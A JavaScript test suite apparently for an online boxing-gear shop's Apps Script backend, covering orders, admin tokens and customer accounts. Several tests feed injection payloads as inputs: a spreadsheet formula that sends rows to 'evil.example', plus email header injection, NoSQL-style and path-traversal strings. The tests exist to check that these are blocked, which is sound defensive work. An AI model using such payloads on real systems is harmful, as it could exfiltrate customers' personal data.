// Tests for order-apps-script.gs against the in-memory Apps Script stand-in (gas-mock.js).
// Run: node _ops/test-backend.js
'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { makeEnv } = require('./gas-mock');

const KEY = 'kobg-test-admin-key-0123456789';
const RB11 = 'gants-de-sac-rival-rb11-evolution-noir';          // 1690 DH, sizes M L XL
const RB10 = 'gants-de-sac-rival-rb10-intelli-shock-blanc';     // 2390 DH, sizes S M L XL
const RS11 = 'gants-de-sparring-rival-rs11v-evolution-or';      // 1990 DH, sizes incl. "16 oz-s"
const BODY = 'protecteur-corporel-rival-neon';                  // 4190 DH, no size

let seq = 0;
function order(extra = {}) {
  seq += 1;
  return Object.assign({
    orderId: 'KOBG-261027-' + 'ABCDEFGH'[seq % 8] + 'B2' + 'CDEFGHJK'[(seq >> 3) % 8],
    nom: 'Yassine El Amrani', telephone: '06 12 34 56 ' + String(seq % 100).padStart(2, '0'), ville: 'Casablanca',
    items: [{ id: RB11 + '--m', qty: 1, unitPrice: 1690 }], subtotal: 1690, total: 1690, promoCode: '', source: 'panier',
  }, extra);
}
const env0 = (o) => makeEnv(Object.assign({ props: { ADMIN_KEY: KEY } }, o));
const rowsOf = (env, name) => env.sheets[name].rows;
const formulas = (env) => Object.values(env.sheets).flatMap((s) => s.rows.flat()).filter((v) => v && typeof v === 'object' && v.formula);

test('health check answers with the version', () => {
  const r = env0().get();
  assert.equal(r.ok, true);
  assert.ok(r.version);
});

test('valid order is stored with server prices, Gestion line and phone as text', () => {
  const env = env0();
  const r = env.post(order({ items: [{ id: RB11 + '--m', qty: 2, unitPrice: 1690 }, { id: BODY, qty: 1, unitPrice: 4190 }], total: 7570 }));
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.subtotal, 7570);
  assert.equal(r.delivery, 0);                                   // >= 2000 DH: free
  assert.equal(r.total, 7570);
  assert.equal(r.adjusted, false);
  assert.equal(r.items[0].name, 'Gants de sac Rival RB11 Evolution');
  assert.equal(r.items[0].size, 'M');
  const rows = rowsOf(env, 'Commandes');
  assert.equal(rows[0][1], 'N° commande');
  const v = rows[1];
  assert.equal(v[1], r.orderId);
  assert.equal(typeof v[3], 'string');
  assert.match(v[3], /^06\d{8}$/);                               // leading 0 kept
  assert.equal(v[5], 'Gants de sac Rival RB11 Evolution x2 / Protecteur corporel Rival');
  assert.equal(v[6], 'M / ');
  assert.equal(v[7], 'Noir / Neon');
  assert.equal(v[8], 3);
  const g = rowsOf(env, 'Gestion');
  assert.deepEqual(g[0].slice(0, 5), ['N° commande', 'Statut', 'Note interne', 'Mis à jour le', 'Historique']);
  assert.equal(g[1][0], r.orderId);
  assert.equal(g[1][1], 'Nouvelle');
});

test('single item, free delivery; promo codes (old KOBG26) are refused', () => {
  const env = env0();
  const a = env.post(order());
  assert.equal(a.total, 1690);
  const b = env.post(order({ promoCode: 'kobg26', total: 1690 }));
  assert.equal(b.discountPct, 0);
  assert.equal(b.discount, 0);
  assert.equal(b.total, 1690);
  assert.equal(b.promoCode, '');
});

test('tampered prices and totals are recomputed and flagged', () => {
  const env = env0();
  const r = env.post(order({ items: [{ id: RB10 + '--l', qty: 1, unitPrice: 1, lineTotal: 1 }], subtotal: 1, total: 26 }));
  assert.equal(r.ok, true);
  assert.equal(r.total, 2390);
  assert.equal(r.adjusted, true);
  const g = rowsOf(env, 'Gestion')[1];
  assert.match(g[2], /Total recalculé/);
  assert.equal(rowsOf(env, 'Commandes')[1][13], 2390);
});

test('fake promo codes and prototype keys give no discount', () => {
  const env = env0();
  for (const code of ['FREE100', 'constructor', '__proto__', 'toString']) {
    const r = env.post(order({ promoCode: code }));
    assert.equal(r.ok, true);
    assert.equal(r.discountPct, 0, code);
    assert.equal(r.total, 1690, code);
  }
});

test('unknown products, bad sizes and odd quantities are refused', () => {
  const env = env0();
  const bad = [
    [{ id: 'gants-imaginaires', qty: 1 }], [{ id: 'constructor', qty: 1 }], [{ id: RB11, qty: 1 }],
    [{ id: RB11 + '--s', qty: 1 }], [{ id: BODY + '--m', qty: 1 }], [{ id: RB11 + '--m', qty: 0 }],
    [{ id: RB11 + '--m', qty: 1.5 }], [{ id: RB11 + '--m', qty: 100 }], [{ id: '<script>', qty: 1 }], [], 'x',
    Array.from({ length: 31 }, () => ({ id: BODY, qty: 1 })),
  ];
  for (const items of bad) {
    const r = env.post(order({ items }));
    assert.equal(r.ok, false, JSON.stringify(items).slice(0, 80));
    assert.match(r.error, /^bad_(item|order)$/);
  }
  assert.equal(env.sheets.Commandes, undefined);                 // nothing written
  const ok = env.post(order({ items: [{ id: RS11 + '--16-oz-s', qty: 1 }] }));
  assert.equal(ok.ok, true);
  assert.equal(ok.items[0].size, '16 oz-s');
});

test('same line twice is merged; more than 200 units refused', () => {
  const env = env0();
  const r = env.post(order({ items: [{ id: RB11 + '--m', qty: 2 }, { id: RB11 + '--m', qty: 3 }] }));
  assert.equal(r.items.length, 1);
  assert.equal(r.items[0].qty, 5);
  const big = env.post(order({ items: [RB11 + '--m', RB11 + '--l', RB11 + '--xl'].map((id) => ({ id, qty: 99 })) }));
  assert.equal(big.error, 'bad_order');
});

test('customer fields are validated', () => {
  const env = env0();
  assert.equal(env.post(order({ nom: 'A' })).field, 'nom');
  assert.equal(env.post(order({ nom: '12345' })).field, 'nom');
  assert.equal(env.post(order({ ville: ' ' })).field, 'ville');
  assert.equal(env.post(order({ telephone: '0512345678' })).field, 'telephone');
  assert.equal(env.post(order({ telephone: '+33612345678' })).field, 'telephone');
  assert.equal(env.post(order({ telephone: '+212 7 12 34 56 78' })).ok, true);
});

test('formula injection never reaches the sheet as a formula', () => {
  const env = env0();
  const r = env.post(order({ nom: '=IMPORTDATA("https://evil.example/?"&A1:A99)', ville: '+HYPERLINK("x")', telephone: '0611111111' }));
  assert.equal(r.ok, true);
  assert.deepEqual(formulas(env), []);
  assert.match(rowsOf(env, 'Commandes')[1][2], /^=IMPORTDATA/);  // kept as plain text
  // admin notes too
  const n = env.post({ action: 'update', key: KEY, id: r.orderId, note: '@SUM(A1)' });
  assert.equal(n.ok, true);
  assert.deepEqual(formulas(env), []);
});

test('control characters and huge strings are cleaned and capped', () => {
  const env = env0();
  const r = env.post(order({ nom: 'Sara\u0000\u202e Bennani\r\n' + 'x'.repeat(500), ville: 'Fès\t\t' }));
  assert.equal(r.ok, true);
  const v = rowsOf(env, 'Commandes')[1];
  assert.ok(v[2].length <= 80);
  assert.ok(!/[\u0000-\u001f\u202e]/.test(v[2]));
  assert.equal(v[4], 'Fès');
});

test('a double submit is stored once; a colliding id from another phone gets a new id', () => {
  const env = env0();
  const o = order();
  const a = env.post(o);
  const b = env.post(o);
  assert.equal(b.ok, true);
  assert.equal(b.duplicate, true);
  assert.equal(b.total, a.total);
  assert.equal(rowsOf(env, 'Commandes').length, 2);
  const c = env.post(Object.assign({}, o, { telephone: '0699999999' }));
  assert.equal(c.ok, true);
  assert.notEqual(c.orderId, a.orderId);
  assert.match(c.orderId, /^KOBG-\d{6}-[A-Z0-9]{4}$/);
});

test('rate limits: 5 orders per phone per hour, 40 per 10 minutes overall', () => {
  const env = env0();
  for (let i = 0; i < 5; i++) assert.equal(env.post(order({ telephone: '0700000001' })).ok, true);
  assert.equal(env.post(order({ telephone: '0700000001' })).error, 'too_many');
  env.cache.clear();
  for (let i = 0; i < 40; i++) assert.equal(env.post(order({ telephone: '06000000' + String(i).padStart(2, '0') })).ok, true);
  assert.equal(env.post(order({ telephone: '0711111111' })).error, 'busy');
});

test('garbage requests are refused without a stack trace', () => {
  const env = env0();
  for (const body of ['', 'not json', '[]', 'null', '"x"', 'x'.repeat(40000)]) {
    const r = env.post(body);
    assert.equal(r.ok, false);
    assert.equal(r.error, 'bad_request');
  }
});

test('catalog unreachable: order kept, client price flagged; last good copy used when known', () => {
  const env = env0({ fetchFail: true });
  const r = env.post(order({ items: [{ id: RB11 + '--m', qty: 1, unitPrice: 1690, name: 'Gants / X', size: 'M', colour: 'Noir' }] }));
  assert.equal(r.ok, true);
  assert.equal(r.adjusted, true);
  assert.match(rowsOf(env, 'Gestion')[1][2], /NON vérifiés/);
  assert.equal(r.items[0].name, 'Gants/X');                      // separator can't break the columns
  const env2 = env0();
  env2.post(order());                                            // fetch works: last good copy saved
  env2.cache.clear();
  env2.fetchFail = true;
  const r2 = env2.post(order({ items: [{ id: RB10 + '--s', qty: 1, unitPrice: 5 }] }));
  assert.equal(r2.total, 2390);
  assert.equal(r2.adjusted, true);
});

test('admin: key missing / too short', () => {
  assert.equal(makeEnv().post({ action: 'auth', key: 'x' }).error, 'no_admin_key');
  const r = makeEnv({ props: { ADMIN_KEY: 'short' } }).post({ action: 'auth', key: 'short' });
  assert.equal(r.error, 'no_admin_key');
  assert.equal(r.reason, 'short');
});

test('admin: wrong keys count down, then lock; signed sessions still work during a lock', () => {
  const env = env0();
  const session = env.post({ action: 'auth', key: KEY, remember: true }).token;
  assert.match(session, /^v1\.\d{10}\./);
  for (let left = 4; left >= 1; left--) {
    const r = env.post({ action: 'auth', key: 'wrong' + left });
    assert.equal(r.error, 'bad_key');
    assert.equal(r.left, left);
  }
  assert.equal(env.post({ action: 'auth', key: 'wrong0' }).error, 'locked');
  assert.equal(env.post({ action: 'list', key: KEY }).error, 'locked');          // the key can't be tried while locked
  assert.equal(env.post({ action: 'list', key: session }).ok, true);             // the owner keeps working
  assert.equal(env.post({ action: 'list', key: 'v1.9999999999.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=' }).error, 'locked');
});

test('admin: tokens are signed, expire, and die with the key', () => {
  const env = env0();
  const tok = env.post({ action: 'auth', key: KEY }).token;
  assert.notEqual(tok, KEY);
  assert.equal(env.post({ action: 'list', key: tok }).ok, true);
  const [, exp, sig] = tok.split('.');
  assert.equal(env.post({ action: 'list', key: 'v1.' + (Number(exp) + 999999) + '.' + sig }).error, 'bad_key');   // forged expiry
  const old = 'v1.' + (Math.floor(Date.now() / 1000) - 10) + '.' + env.ctx.sign_(KEY, String(Math.floor(Date.now() / 1000) - 10));
  assert.equal(env.post({ action: 'list', key: old }).error, 'expired');
  env.props.set('ADMIN_KEY', 'a-brand-new-admin-key-123');
  assert.equal(env.post({ action: 'list', key: tok }).error, 'bad_key');
});

test('admin: list returns what admin.js renders; update changes status, history and note', () => {
  const env = env0();
  const a = env.post(order({ items: [{ id: RS11 + '--14-oz', qty: 2 }, { id: BODY, qty: 1 }] }));
  assert.equal(env.post({ action: 'list', key: 'nope' }).error, 'bad_key');
  const tok = env.post({ action: 'auth', key: KEY }).token;
  const l = env.post({ action: 'list', key: tok });
  assert.equal(l.ok, true);
  assert.match(l.today, /^\d{4}-\d{2}-\d{2}$/);
  const o = l.orders[0];
  for (const k of ['row', 'id', 'ts', 'recu', 'day', 'nom', 'tel', 'ville', 'articles', 'taille', 'couleur', 'nb', 'sousTotal', 'promo', 'remise', 'livraison', 'total', 'statut', 'note', 'maj', 'hist']) assert.ok(k in o, k);
  assert.equal(o.id, a.orderId);
  assert.equal(o.day, l.today);
  assert.match(o.recu, /^\d{2}\/\d{2}\/\d{4} \d{2}:\d{2}$/);
  assert.match(o.tel, /^0\d{9}$/);
  assert.equal(o.articles, 'Gants de sparring Rival RS11V Evolution x2 / Protecteur corporel Rival');
  assert.equal(o.taille, '14 oz / ');
  assert.equal(o.remise, 0);
  assert.equal(o.total, a.total);
  assert.equal(o.statut, 'Nouvelle');
  assert.equal(o.hist[0].by, 'site');

  assert.equal(env.post({ action: 'update', key: tok, id: o.id, status: 'Volée' }).error, 'bad_status');
  assert.equal(env.post({ action: 'update', key: tok, id: 'KOBG-000000-XXXX', status: 'Livrée' }).error, 'not_found');
  assert.equal(env.post({ action: 'drop', key: tok }).error, 'bad_action');
  const u = env.post({ action: 'update', key: tok, id: o.id, status: 'Confirmée' });
  assert.equal(u.ok, true);
  assert.equal(u.order.statut, 'Confirmée');
  assert.deepEqual(u.order.hist.slice(-1)[0].to, 'Confirmée');
  const n = env.post({ action: 'update', key: tok, id: o.id, note: 'Rappeler après 18 h\nportail bleu' });
  assert.equal(n.order.note, 'Rappeler après 18 h\nportail bleu');
  const l2 = env.post({ action: 'list', key: tok });
  assert.equal(l2.orders[0].statut, 'Confirmée');
  const s = env.post({ action: 'stats', key: tok, period: 'all' });
  assert.equal(s.stats.commandes, 1);
  assert.equal(s.stats.caAEncaisser, a.total);
});

test('admin: works with an older Gestion tab and old rows', () => {
  const env = env0();
  env.post(order());
  const g = env.sheets.Gestion;
  g.rows = [['Commande', 'Etat', 'Notes']];                        // older layout, other names
  const c = env.sheets.Commandes;
  c.rows.push(['27/10/2026 09:15', 'KOBG-261027-OLD1', 'Ancien Client', 612345678, 'Rabat', 'Gants de sac Rival RB11 Evolution', 'L', 'Noir', 1, 1690, '', 0, 25, 1715]);
  g.rows.push(['KOBG-261027-OLD1', 'Expédiée', 'déjà parti']);
  const l = env.post({ action: 'list', key: KEY });
  assert.equal(l.ok, true, JSON.stringify(l));
  const old = l.orders.find((o) => o.id === 'KOBG-261027-OLD1');
  assert.equal(old.statut, 'Expédiée');
  assert.equal(old.note, 'déjà parti');
  assert.equal(old.tel, '0612345678');
  assert.equal(old.recu, '27/10/2026 09:15');
  assert.ok(old.ts > 0);
  const u = env.post({ action: 'update', key: KEY, id: 'KOBG-261027-OLD1', status: 'Livrée' });
  assert.equal(u.order.statut, 'Livrée');
  assert.equal(g.rows[0][0], 'Commande');                          // existing header kept
});

test('notification e-mail when NOTIFY_EMAIL is set, never blocks the order', () => {
  const env = env0({ props: { ADMIN_KEY: KEY, NOTIFY_EMAIL: 'shop@example.org' } });
  const r = env.post(order({ ville: 'Tanger\r\nBcc: x@y.z' }));
  assert.equal(r.ok, true);
  assert.equal(env.mails.length, 1);
  assert.match(env.mails[0].subject, new RegExp(r.orderId));
  assert.ok(!/[\r\n]/.test(env.mails[0].subject));
  env.ctx.MailApp.sendEmail = () => { throw new Error('quota'); };
  assert.equal(env.post(order()).ok, true);
});

test('setup() and generateAdminKey() from the editor', () => {
  const env = makeEnv();
  env.run('generateAdminKey');
  assert.ok(env.props.get('ADMIN_KEY').length >= 32);
  env.run('setup');
  assert.ok(env.sheets.Commandes && env.sheets.Gestion);
  assert.ok(env.logs.some((l) => /ADMIN_KEY configurée/.test(l)));
});

// ===================== customer accounts =====================
const crypto = require('crypto');
const PW = 'Gants-Rouges-2026';
let acctSeq = 0;
function signup(env, extra = {}) {
  acctSeq += 1;
  return env.post(Object.assign({ action: 'register', nom: 'Salma Bennani', email: `salma${acctSeq}@example.ma`,
    telephone: '0661 22 33 ' + String(acctSeq % 100).padStart(2, '0'), password: PW }, extra));
}
const sessionsOf = (env, uid) => [...env.props.entries()].filter(([k, v]) => k.startsWith('ses:') && JSON.parse(v).u === uid);
const resetLink = (mail) => /compte#reset=(k1\.[A-Za-z0-9_-]{43})/.exec(mail.body)[1];

test('accounts: PBKDF2 matches the reference implementation (Node crypto)', () => {
  const env = makeEnv();
  const salt = '00112233445566778899aabbccddeeff';
  for (const [pw, n] of [['motdepasse', 1], ['Gants-Rouges-2026', 2], ['éàç 😀 mot', 1000]]) {
    assert.equal(env.ctx.pbkdf2_(pw, salt, n), crypto.pbkdf2Sync(Buffer.from(pw, 'utf8'), Buffer.from(salt, 'hex'), n, 32, 'sha256').toString('hex'), pw);
  }
});

test('accounts: register stores a salted hash (never the password) and signs in', () => {
  const env = env0();
  const r = signup(env, { email: '  Salma.B@Example.MA ', adresse: '12 rue Ibn Battouta, Maarif', ville: 'Casablanca' });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.match(r.session, /^k1\.[A-Za-z0-9_-]{43}$/);
  assert.ok(r.exp > Date.now() + 29 * 864e5);
  assert.deepEqual(Object.keys(r.profile).sort(), ['adresse', 'depuis', 'email', 'id', 'nom', 'telephone', 'ville']);
  assert.equal(r.profile.email, 'salma.b@example.ma');
  assert.match(r.profile.telephone, /^06\d{8}$/);
  const rows = rowsOf(env, 'Clients');
  assert.deepEqual(rows[0], ['ID client', 'E-mail', 'Nom', 'Téléphone', 'Adresse', 'Ville', 'Créé le', 'Mis à jour le', 'Dernière connexion', 'Sel', 'Empreinte', 'Itérations']);
  const v = rows[1];
  assert.ok(!JSON.stringify(rows).includes(PW));                         // never in clear
  assert.match(v[9], /^[0-9a-f]{32}$/);                                   // salt kept as text
  assert.match(v[10], /^[0-9a-f]{64}$/);
  assert.ok(v[11] >= 1000);
  assert.equal(env.ctx.pbkdf2_(PW, v[9], v[11]), v[10]);
  assert.equal(typeof v[3], 'string');
  // the session is stored hashed: the token itself is nowhere on the server
  assert.ok(![...env.props.keys(), ...env.props.values()].some((x) => x.includes(r.session)));
  assert.equal(sessionsOf(env, r.profile.id).length, 1);
  const short = signup(env, { remember: false });
  assert.ok(short.exp < Date.now() + 2 * 864e5);
});

test('accounts: register validates fields, weak passwords and duplicates', () => {
  const env = env0();
  assert.equal(signup(env, { email: 'pas-un-email' }).field, 'email');
  assert.equal(signup(env, { email: 'a@b' }).field, 'email');
  assert.equal(signup(env, { nom: 'A' }).field, 'nom');
  assert.equal(signup(env, { telephone: '0512' }).field, 'telephone');
  assert.equal(signup(env, { password: 'court' }).error, 'weak_password');
  assert.equal(signup(env, { password: '12345678' }).error, 'weak_password');
  assert.equal(signup(env, { password: 'aaaaaaaaaa' }).error, 'weak_password');
  assert.equal(signup(env, { email: 'moi@example.ma', password: 'MOI@example.ma' }).error, 'weak_password');
  assert.equal(signup(env, { password: 'x'.repeat(129) }).error, 'bad_field');
  assert.equal(signup(env, { password: 12345678 }).error, 'weak_password');
  assert.equal(signup(env, { email: 'dup@example.ma' }).ok, true);
  const d = signup(env, { email: 'DUP@example.ma' });
  assert.equal(d.error, 'email_taken');
  assert.equal(rowsOf(env, 'Clients').length, 2);
});

test('accounts: profile fields never reach the sheet as formulas', () => {
  const env = env0();
  const r = signup(env, { nom: '=HYPERLINK("http://x","clic") Nom', adresse: '+SUM(A1:A9)', ville: '@Fès', email: '=x@example.ma' });
  assert.equal(r.ok, true, JSON.stringify(r));
  const u = env.post({ action: 'update_profile', session: r.session, adresse: '-1+2 rue\u0000 X', nom: '@Salma Ben' });
  assert.equal(u.ok, true, JSON.stringify(u));
  assert.deepEqual(formulas(env), []);
  assert.equal(rowsOf(env, 'Clients')[1][4], '-1+2 rue X');
});

test('accounts: login with one generic error, lock after 5 wrong passwords (known or unknown e-mail)', () => {
  const env = env0();
  const r = signup(env, { email: 'karim@example.ma' });
  const ok = env.post({ action: 'login', email: 'KARIM@example.ma', password: PW });
  assert.equal(ok.ok, true);
  assert.equal(ok.profile.id, r.profile.id);
  assert.notEqual(ok.session, r.session);
  const wrong = env.post({ action: 'login', email: 'karim@example.ma', password: 'mauvais-mot' });
  const ghost = env.post({ action: 'login', email: 'personne@example.ma', password: 'mauvais-mot' });
  assert.deepEqual(Object.keys(wrong).sort(), Object.keys(ghost).sort());
  assert.equal(wrong.error, 'bad_login');
  assert.equal(ghost.error, 'bad_login');
  assert.equal(env.post({ action: 'login', email: 'karim@example.ma' }).error, 'bad_login');
  assert.equal(env.post({ action: 'login', email: 'karim@example.ma', password: { $ne: 1 } }).error, 'bad_login');
  for (let i = 0; i < 3; i++) assert.equal(env.post({ action: 'login', email: 'karim@example.ma', password: 'x' + i }).error, 'bad_login');
  const locked = env.post({ action: 'login', email: 'karim@example.ma', password: 'encore-faux' });
  assert.equal(locked.error, 'locked');
  assert.ok(locked.retryIn > 0);
  assert.equal(env.post({ action: 'login', email: 'karim@example.ma', password: PW }).error, 'locked');   // even the right one
  for (let i = 0; i < 4; i++) env.post({ action: 'login', email: 'personne@example.ma', password: 'x' + i });
  assert.equal(env.post({ action: 'login', email: 'personne@example.ma', password: 'y' }).error, 'locked');  // same for unknown
  assert.equal(env.post({ action: 'login', email: 'autre@example.ma', password: 'y' }).error, 'bad_login');  // per e-mail
  env.cache.clear();
  assert.equal(env.post({ action: 'login', email: 'karim@example.ma', password: PW }).ok, true);
});

test('accounts: sessions — me, bad/expired/forged tokens, logout, cap per account', () => {
  const env = env0();
  const r = signup(env);
  assert.equal(env.post({ action: 'me', session: r.session }).profile.email, r.profile.email);
  for (const bad of [undefined, '', 'k1.' + 'A'.repeat(43), r.session + 'x', 'v1.123.abc', { a: 1 }]) {
    assert.equal(env.post({ action: 'me', session: bad }).error, 'auth', String(bad));
  }
  const [key, val] = sessionsOf(env, r.profile.id)[0];
  env.props.set(key, JSON.stringify(Object.assign(JSON.parse(val), { exp: Date.now() - 1 })));
  assert.equal(env.post({ action: 'me', session: r.session }).error, 'auth');
  assert.equal(env.props.has(key), false);                                 // expired: deleted
  const l = env.post({ action: 'login', email: r.profile.email, password: PW });
  assert.equal(env.post({ action: 'logout', session: l.session }).ok, true);
  assert.equal(env.post({ action: 'me', session: l.session }).error, 'auth');
  // "every device": all sessions of this account end, another account's stay
  const other = signup(env, { email: 'autre@example.ma' });
  const d1 = env.post({ action: 'login', email: r.profile.email, password: PW });
  const d2 = env.post({ action: 'login', email: r.profile.email, password: PW });
  assert.equal(env.post({ action: 'logout', session: d1.session, all: true }).ok, true);
  assert.equal(env.post({ action: 'me', session: d2.session }).error, 'auth');
  assert.equal(sessionsOf(env, r.profile.id).length, 0);
  assert.equal(env.post({ action: 'me', session: other.session }).ok, true);
  assert.equal(env.post({ action: 'logout', session: d1.session, all: true }).ok, true);   // already gone: still ok
  for (let i = 0; i < 12; i++) env.post({ action: 'login', email: r.profile.email, password: PW });
  assert.equal(sessionsOf(env, r.profile.id).length, 10);
  // account removed from the sheet by the team: its sessions die
  const last = env.post({ action: 'login', email: r.profile.email, password: PW });
  env.sheets.Clients.deleteRow(2);
  assert.equal(env.post({ action: 'me', session: last.session }).error, 'auth');
  assert.equal(env.post({ action: 'my_orders' }).error, 'auth');
});

test('accounts: update profile and saved delivery address', () => {
  const env = env0();
  const r = signup(env);
  const u = env.post({ action: 'update_profile', session: r.session, nom: 'Salma Bennani-Alaoui', telephone: '+212 7 00 11 22 33',
    adresse: 'Résidence Al Andalous, apt 4\n2e étage', ville: 'Marrakech' });
  assert.equal(u.ok, true, JSON.stringify(u));
  assert.equal(u.profile.telephone, '0700112233');
  assert.equal(u.profile.adresse, 'Résidence Al Andalous, apt 4 2e étage');
  assert.equal(u.profile.email, r.profile.email);
  assert.equal(env.post({ action: 'update_profile', session: r.session, email: 'pirate@x.ma' }).profile.email, r.profile.email);
  assert.equal(env.post({ action: 'update_profile', session: r.session, telephone: '123' }).field, 'telephone');
  assert.equal(env.post({ action: 'update_profile', session: r.session, nom: '' }).field, 'nom');
  assert.equal(env.post({ action: 'update_profile', session: r.session, adresse: 'x'.repeat(500) }).profile.adresse.length, 200);
  assert.equal(env.post({ action: 'me', session: r.session }).profile.ville, 'Marrakech');
});

test('accounts: change password checks the current one and signs out other devices', () => {
  const env = env0();
  const r = signup(env);
  const other = env.post({ action: 'login', email: r.profile.email, password: PW });
  assert.equal(env.post({ action: 'change_password', session: r.session, current: 'faux', password: 'Nouveau-Pass-99' }).error, 'bad_password');
  assert.equal(env.post({ action: 'change_password', session: r.session, current: PW, password: 'court' }).error, 'weak_password');
  const c = env.post({ action: 'change_password', session: r.session, current: PW, password: 'Nouveau-Pass-99' });
  assert.equal(c.ok, true, JSON.stringify(c));
  assert.equal(env.post({ action: 'me', session: r.session }).ok, true);    // this device stays signed in
  assert.equal(env.post({ action: 'me', session: other.session }).error, 'auth');
  assert.equal(env.post({ action: 'login', email: r.profile.email, password: PW }).error, 'bad_login');
  assert.equal(env.post({ action: 'login', email: r.profile.email, password: 'Nouveau-Pass-99' }).ok, true);
});

test('accounts: older, weaker hashes are upgraded at the next login', () => {
  const env = env0();
  const r = signup(env);
  const row = rowsOf(env, 'Clients')[1];
  const target = row[11];
  row[9] = 'ffeeddccbbaa99887766554433221100';
  row[10] = env.ctx.pbkdf2_(PW, row[9], 10);
  row[11] = 10;
  assert.equal(env.post({ action: 'login', email: r.profile.email, password: PW }).ok, true);
  assert.equal(row[11], target);
  assert.notEqual(row[9], 'ffeeddccbbaa99887766554433221100');
  assert.equal(env.ctx.pbkdf2_(PW, row[9], row[11]), row[10]);
});

test('accounts: orders placed while signed in are linked; history shows only my orders and statuses', () => {
  const env = env0();
  const a = signup(env), b = signup(env);
  const o1 = env.post(order({ session: a.session }));
  const o2 = env.post(order({ session: a.session, items: [{ id: BODY, qty: 1 }], promoCode: 'KOBG26' }));
  const ob = env.post(order({ session: b.session }));
  const guest = env.post(order());
  const stale = env.post(order({ session: 'k1.' + 'B'.repeat(43) }));
  assert.equal(o1.linked, true);
  assert.equal(guest.linked, false);
  assert.equal(stale.ok, true);                                             // a stale token never blocks an order
  assert.equal(stale.linked, false);
  const c = rowsOf(env, 'Commandes');
  assert.equal(c[0][14], 'Compte client');
  assert.equal(c.find((v) => v[1] === o1.orderId)[14], a.profile.id);
  assert.equal(c.find((v) => v[1] === guest.orderId)[14] || '', '');
  assert.match(rowsOf(env, 'Gestion').find((v) => v[0] === o1.orderId)[2], new RegExp('Client connecté : ' + a.profile.email.replace('.', '\\.')));

  const tok = env.post({ action: 'auth', key: KEY }).token;
  env.post({ action: 'update', key: tok, id: o1.orderId, status: 'Confirmée' });
  env.post({ action: 'update', key: tok, id: o1.orderId, status: 'Expédiée', note: 'SECRET interne : client difficile' });
  const mine = env.post({ action: 'my_orders', session: a.session });
  assert.equal(mine.ok, true);
  assert.deepEqual(mine.orders.map((o) => o.id).sort(), [o1.orderId, o2.orderId].sort());
  const m1 = mine.orders.find((o) => o.id === o1.orderId);
  assert.equal(m1.statut, 'Expédiée');
  assert.deepEqual(m1.suivi.map((h) => h.to), ['Nouvelle', 'Confirmée', 'Expédiée']);
  assert.deepEqual(m1.items, [{ name: 'Gants de sac Rival RB11 Evolution', qty: 1, size: 'M', colour: 'Noir' }]);
  assert.equal(m1.total, 1690);
  assert.ok(!JSON.stringify(mine).includes('SECRET'));
  assert.ok(!JSON.stringify(mine).includes('Client connecté'));
  const m2 = mine.orders.find((o) => o.id === o2.orderId);
  assert.equal(m2.promo, '');                                               // promo codes removed
  assert.equal(env.post({ action: 'my_orders', session: b.session }).orders.map((o) => o.id).join(), ob.orderId);
  assert.equal(env.post({ action: 'list', key: tok }).orders.length, 5);   // admin still sees every order
});

test('accounts: the account column goes after any extra column of an older Commandes tab', () => {
  const env = env0();
  env.post(order());
  const c = env.sheets.Commandes;
  c.rows[0][14] = 'Remarque';
  const a = signup(env);
  const o = env.post(order({ session: a.session }));
  assert.equal(c.rows[0][15], 'Compte client');
  assert.equal(c.rows.find((v) => v[1] === o.orderId)[15], a.profile.id);
  assert.equal(env.post({ action: 'my_orders', session: a.session }).orders.length, 1);
});

test('accounts: password reset by e-mail — same answer for unknown e-mails, single-use 1 h link', () => {
  const env = env0();
  const r = signup(env, { email: 'nadia@example.ma' });
  const other = env.post({ action: 'login', email: 'nadia@example.ma', password: PW });
  const unknown = env.post({ action: 'reset_request', email: 'inconnu@example.ma' });
  const known = env.post({ action: 'reset_request', email: 'Nadia@example.ma' });
  assert.deepEqual(Object.keys(unknown).sort(), Object.keys(known).sort());
  assert.equal(unknown.ok, true);
  assert.equal(env.mails.length, 1);
  const m = env.mails[0];
  assert.equal(m.to, 'nadia@example.ma');
  assert.ok(!/[\r\n]/.test(m.subject));
  assert.match(m.body, /https:\/\/knockoutboxinggear\.com\/compte#reset=k1\./);
  assert.ok(!m.body.includes(PW));
  const tok = resetLink(m);
  assert.ok(![...env.props.keys(), ...env.props.values()].some((x) => x.includes(tok)));   // stored hashed
  assert.equal(env.post({ action: 'reset_confirm', token: tok, password: 'court' }).error, 'weak_password');
  const c = env.post({ action: 'reset_confirm', token: tok, password: 'Nouveau-Depart-7' });
  assert.equal(c.ok, true, JSON.stringify(c));
  assert.equal(env.post({ action: 'me', session: c.session }).ok, true);
  assert.equal(env.post({ action: 'me', session: r.session }).error, 'auth');       // every old session revoked
  assert.equal(env.post({ action: 'me', session: other.session }).error, 'auth');
  assert.equal(env.post({ action: 'reset_confirm', token: tok, password: 'Encore-Autre-8' }).error, 'bad_reset');  // single use
  assert.equal(env.post({ action: 'login', email: 'nadia@example.ma', password: 'Nouveau-Depart-7' }).ok, true);
  assert.equal(env.post({ action: 'reset_confirm', token: 'k1.' + 'C'.repeat(43), password: 'Nouveau-Depart-7' }).error, 'bad_reset');
  assert.equal(env.post({ action: 'reset_confirm', token: '../etc', password: 'Nouveau-Depart-7' }).error, 'bad_reset');
});

test('accounts: reset links expire, only the newest works, and a reset unlocks the account', () => {
  const env = env0();
  signup(env, { email: 'omar@example.ma' });
  for (let i = 0; i < 5; i++) env.post({ action: 'login', email: 'omar@example.ma', password: 'faux' + i });
  assert.equal(env.post({ action: 'login', email: 'omar@example.ma', password: PW }).error, 'locked');
  env.post({ action: 'reset_request', email: 'omar@example.ma' });
  env.post({ action: 'reset_request', email: 'omar@example.ma' });
  const first = resetLink(env.mails[0]), second = resetLink(env.mails[1]);
  assert.equal(env.post({ action: 'reset_confirm', token: first, password: 'Nouveau-Depart-7' }).error, 'bad_reset');
  const [k, v] = [...env.props.entries()].find(([key]) => key.startsWith('rst:'));
  env.props.set(k, JSON.stringify(Object.assign(JSON.parse(v), { exp: Date.now() - 1 })));
  assert.equal(env.post({ action: 'reset_confirm', token: second, password: 'Nouveau-Depart-7' }).error, 'bad_reset');
  env.post({ action: 'reset_request', email: 'omar@example.ma' });
  const third = resetLink(env.mails[2]);
  assert.equal(env.post({ action: 'reset_confirm', token: third, password: 'Nouveau-Depart-7' }).ok, true);
  assert.equal(env.post({ action: 'login', email: 'omar@example.ma', password: 'Nouveau-Depart-7' }).ok, true);
});

